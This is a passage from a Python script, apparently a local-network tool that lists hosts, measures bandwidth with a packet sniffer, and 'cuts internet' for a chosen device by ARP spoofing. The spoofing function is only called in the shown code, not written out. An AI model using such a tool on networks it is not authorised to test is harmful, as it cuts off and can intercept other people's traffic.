                     print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Currently cutting internet for: {Fore.CYAN}{spoofing_target['ip']}{Style.RESET_ALL}")
                needs_manual_refresh_display = True # Prevent immediate auto-refresh display
                last_refresh_time = current_time # Reset timer

            elif key_pressed == 'q':
                print(f"\n{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Quitting...{Style.RESET_ALL}")
                break # Exit the main loop

            # Auto-refresh logic
            if refresh_due and not needs_manual_refresh_display and sniffer_alive and not key_pressed:
                os.system('cls' if os.name == 'nt' else 'clear') # Clear screen
                # No need to re-scan ARP here, just reprint with updated bandwidth
                print_results(discovered_hosts)
                print(f"\nPress '{Fore.YELLOW}r{Style.RESET_ALL}' to refresh, '{Fore.YELLOW}c{Style.RESET_ALL}' to cut/uncut internet, '{Fore.YELLOW}q{Style.RESET_ALL}' to quit.")
                if spoofing_target:
                     print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Currently cutting internet for: {Fore.CYAN}{spoofing_target['ip']}{Style.RESET_ALL}")
                last_refresh_time = current_time
            elif needs_manual_refresh_display:
                 needs_manual_refresh_display = False # Reset flag after one loop iteration

            time.sleep(0.1) # Small sleep to prevent high CPU usage

    except KeyboardInterrupt:
        print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!]{Style.RESET_ALL} Scan aborted by user.{Style.RESET_ALL}")
    finally:
        # Stop the sniffer thread gracefully
        if sniffer_alive and sniffer_thread.is_alive():
            print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Stopping packet sniffer...{Style.RESET_ALL}")
            stop_sniffing_event.set()
            sniffer_thread.join(timeout=2) # Wait for sniffer to stop

        # Stop ARP spoofing if it's running
        stop_spoofing()

        print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Exiting program.")
        # Colorama autoreset should handle cleanup, but explicit deinit is fine too
        # from colorama import deinit
        # deinit()